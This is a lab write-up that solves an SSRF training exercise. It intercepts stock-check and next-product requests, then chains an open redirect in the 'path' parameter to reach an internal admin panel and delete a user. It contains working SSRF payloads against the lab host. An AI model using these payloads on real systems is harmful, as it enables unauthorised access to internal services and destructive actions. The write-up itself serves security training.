
<p align="center">
  <img src="./screenshots/ssrf_logo_.png" alt="ssrf_logo"/>
</p>

---

- 🎯 **Target:** SSRF Lab - with filter bypass via open redirection vulnerability
- 🧑‍💻 **Author:** `sonyahack1`
- 📅 **Date:** 23.04.2025
- 📊 **Difficulty:** PRACTITIONER
- 📁 **Category:** Web - SSRF (`open redirect`)

---

## 🔍 Request interception

> Intercepting the main stock-fetch request in BurpSuite:

```http

POST /product/stock HTTP/2
Host: 0ae6007703e16ce381d3c0f8000d001f.web-security-academy.net
Cookie: session=****
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ae6007703e16ce381d3c0f8000d001f.web-security-academy.net/product?productId=14
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Origin: https://0ae6007703e16ce381d3c0f8000d001f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

```
```none
stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D14%26storeId%3D1
```

> with 'urlencode' extension

```none

stockApi=<@urlencode>/product/stock/check?productId=14&storeId=1</@urlencode>

```

> I need to bypass regular SSRF protection.
> On the product description page there is an option to open the next product (next product).

## Intercepting this request (functionality next product)

```http

GET /product/nextProduct?currentProductId=15&path=/product?productId=16 HTTP/2
Host: 0a9e004c0393e4df8052ad46005c008a.web-security-academy.net
Cookie: session=****
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9e004c0393e4df8052ad46005c008a.web-security-academy.net/product?productId=15
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

```

> I use SSRF filter bypass technology via open redirect. I replace the value of the “path” parameter with “http://192.168.0.12:8080/admin/” in main reqeust
> and receive a response with access to the admin panel.

```none

stockApi=<@urlencode>/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin/</@urlencode>

```

> I access the admin panel and users.

![Access Admin panel](./screenshots/access_admin_panel.png)

> I delete the user 'Carlos' with url 'http://192.168.0.12:8080/admin/delete?username=carlos'

```none
 
stockApi=<@urlencode>/product/nextProduct?currentProductId=4&path=http://192.168.0.12:8080/admin/delete?username=carlos</@urlencode>

```

![Solved lab](./screenshots/solved_lab.png)
